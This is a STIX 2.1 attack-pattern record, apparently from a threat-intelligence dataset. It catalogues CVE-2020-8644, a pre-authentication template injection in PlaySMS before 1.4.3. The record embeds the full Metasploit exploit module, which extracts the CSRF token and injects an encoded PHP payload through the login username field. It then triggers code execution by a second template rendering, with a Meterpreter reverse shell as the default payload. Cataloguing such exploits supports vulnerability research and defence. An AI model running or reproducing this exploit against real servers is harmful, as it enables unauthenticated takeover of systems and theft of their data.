{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7de6f342-7efc-4e26-9907-c4937aa39994",
    "created": "2024-08-14T17:08:59.076861Z",
    "modified": "2024-08-14T17:08:59.076865Z",
    "name": "PlaySMS index.php Unauthenticated Template Injection Code Execution",
    "description": " This module exploits a preauth Server-Side Template Injection vulnerability that leads to remote code execution in PlaySMS before version 1.4.3. This issue is caused by double processing a server-side template with a custom PHP template system called 'TPL' which is used in the PlaySMS template engine at `src/Playsms/Tpl.php:_compile()`. The vulnerability is triggered when an attacker supplied username with a malicious payload is submitted. This malicious payload is then stored in a TPL template which when rendered a second time, results in code execution. The TPL(https://github.com/antonraharja/tpl) template language is vulnerable to PHP code injection.  This module was tested against PlaySMS 1.4 on HackTheBox's Forlic Machine. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/playsms_template_injection.rb",
            "external_id": "playsms_template_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-8644"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=zu-bwoAtTrc"
        },
        {
            "source_name": "reference",
            "url": "https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PlaySMS index.php Unauthenticated Template Injection Code Execution',\n        'Description' => %q{\n          This module exploits a preauth Server-Side Template Injection vulnerability that leads to remote code execution\n          in PlaySMS before version 1.4.3. This issue is caused by double processing a server-side template with a custom\n          PHP template system called 'TPL' which is used in the PlaySMS template engine at\n          `src/Playsms/Tpl.php:_compile()`. The vulnerability is triggered when an attacker supplied username with a\n          malicious payload is submitted. This malicious payload is then stored in a TPL template which when rendered a\n          second time, results in code execution.\n          The TPL(https://github.com/antonraharja/tpl) template language is vulnerable to PHP code injection.\n\n          This module was tested against PlaySMS 1.4 on HackTheBox's Forlic Machine.\n        },\n        'Author' => [\n          'Touhid M.Shaikh <touhidshaikh22[at]gmail.com>', # Metasploit Module\n          'Lucas Rosevear' # Found and Initial PoC by NCC Group\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-8644'],\n          ['URL', 'https://www.youtube.com/watch?v=zu-bwoAtTrc'],\n          ['URL', 'https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/']\n        ],\n        'DefaultOptions' => {\n          'SSL' => false,\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n          'ENCODER' => 'php/base64'\n        },\n        'Privileged' => false,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'PlaySMS Before 1.4.3', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-02-05'\n      )\n      )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Base playsms directory path', '/']),\n      ]\n    )\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(uri, 'index.php')\n      })\n    rescue StandardError\n      vprint_error('Unable to access the index.php file')\n      return CheckCode::Unknown\n    end\n\n    if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_auth&route=login')\n      return Exploit::CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  # Send Payload in Login Request\n  def login\n    res = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'method' => 'GET',\n      'vars_get' => {\n        'app' => 'main',\n        'inc' => 'core_auth',\n        'route' => 'login'\n      }\n    })\n\n    # Grabbing CSRF token from body\n    /name=\"X-CSRF-Token\" value=\"(?<csrf>[a-z0-9\"]+)\">/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine the CSRF token\") if csrf.nil?\n    vprint_good(\"X-CSRF-Token for login : #{csrf}\")\n\n    cookies = res.get_cookies\n\n    vprint_status('Trying to send the payload in the username field...')\n\n    # Encoded in base64 to avoid HTML TAGS which are filter by the Application which is also blocking semicolon(;), that is why we're using delete_suffix(';')\n    evil = \"{{#{payload.encoded.delete_suffix(';')}}}\"\n\n    # Send Payload with cookies.\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'cookie' => cookies,\n      'vars_get' => Hash[{\n        'app' => 'main',\n        'inc' => 'core_auth',\n        'route' => 'login',\n        'op' => 'login'\n      }.to_a.shuffle],\n      'vars_post' => Hash[{\n        'X-CSRF-Token' => csrf,\n        'username' => evil,\n        'password' => ''\n      }.to_a.shuffle]\n    })\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to Login request\") if res.nil?\n\n    # Request Status Check\n    if res.code == 302\n      print_good('Payload successfully sent')\n      return cookies\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Something went wrong\")\n    end\n  end\n\n  def exploit\n    cookies = login\n    vprint_status(\"Cookies here : #{cookies}\")\n    # Execute Last Sent Username.\n    send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'method' => 'GET',\n      'cookie' => cookies,\n      'vars_get' => {\n        'app' => 'main',\n        'inc' => 'core_auth',\n        'route' => 'login'\n      }\n    }, 0)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-05",
    "x_mitre_platforms": [
        "['php']"
    ]
}